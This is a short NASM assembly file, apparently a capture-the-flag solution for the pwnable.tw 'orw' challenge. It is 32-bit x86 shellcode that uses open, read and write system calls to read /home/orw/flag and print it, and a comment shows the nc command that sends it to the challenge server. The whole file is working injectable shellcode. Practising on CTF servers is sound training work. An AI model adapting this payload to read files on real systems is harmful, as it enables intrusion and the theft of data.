; nasm read_flag.asm
; (cat read_flag; cat) | nc chall.pwnable.tw 10001
BITS 32

%define FLAG_BUFFER 0x804a0c4
%define FLAG_BUFFER_SIZE 100

call start
db "/home/orw/flag", 0
start:
pop ebx
xor ecx, ecx ; O_RDONLY = 0
xor eax, eax
mov al, 0x5 ; open
int 0x80

mov ebx, eax ; fd
mov ecx, FLAG_BUFFER
mov edx, FLAG_BUFFER_SIZE
mov al, 0x3 ; read
int 0x80

mov ebx, 1   ; stdout
mov ecx, FLAG_BUFFER
mov edx, eax ; num of bytes read
mov al, 0x4  ; write
int 0x80
